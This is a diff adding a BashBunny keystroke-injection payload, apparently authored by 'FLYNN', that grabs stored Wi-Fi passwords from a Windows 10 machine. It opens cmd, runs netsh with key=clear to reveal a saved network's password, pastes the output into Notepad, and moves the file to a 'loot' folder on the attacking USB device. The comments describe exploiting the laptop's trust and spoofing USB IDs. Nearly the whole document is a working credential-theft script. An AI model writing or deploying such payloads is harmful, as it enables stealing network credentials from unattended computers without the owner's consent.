@@ -1,0 +1,74 @@
+# Wifi password grabber
+# windows 10 OS
+# BashBunny script
+# remove Q for rubber ducky script
+# Author: FLYNN
+# exploits trust of laptop runs cmd 
+# for known passwords (potential admin privelages)
+# Replace dots with valid vid and pid for what you want to spoof and emulate as 
+# to find more go to www.kali-usb.org/usb-ids
+# In the case of your own networks replace <iPhone> with your network name and <yougotme> with your desired file name 
+ATTACKMODE STORAGE HID
+Q DELAY 5000
+Q GUI r
+Q DELAY 500
+Q STRING cmd 
+Q DELAY 500
+Q ENTER
+Q DELAY 1000
+Q STRING color FE 
+Q DELAY 100
+Q ENTER
+Q STRING netsh wlan show profile 
+Q DELAY 500
+Q ENTER 
+Q DELAY 500
+Q STRING netsh wlan show profile iPhone key=clear 
+Q DELAY 500
+Q ENTER
+Q DELAY 500
+Q CONTROL a 
+Q DELAY 100
+Q CONTROL c
+Q DELAY 300
+Q STRINGLN exit 
+Q DELAY 700
+Q INJECT_MOD 
+Q WINDOWS
+Q DELAY 500
+Q STRING notepad
+Q DELAY 100
+Q ENTER
+Q DELAY 500
+Q CONTROL v 
+Q DELAY 200
+Q CONTROL s 
+Q DELAY 300
+Q BACKSPACE
+Q DELAY 50
+Q BACKSPACE
+Q STRING pass
+Q ENTER
+Q DELAY 300
+Q ALT F4 
+Q DELAY 300
+Q GUI r 
+Q DELAY 200
+Q STRING cmd 
+Q ENTER
+Q DELAY 500
+Q STRING color FE 
+Q ENTER
+Q DELAY 500
+Q STRING mode col:cons=18 lines=1 
+Q DELAY 100
+Q ENTER
+Q DELAY 500
+Q STRING cd D:/
+Q ENTER 
+Q STRING move pass.txt D:/loot
+Q ENTER 
+Q DELAY 200
+Q ALT F4 
+Q DELAY 200
+Q ALT F4
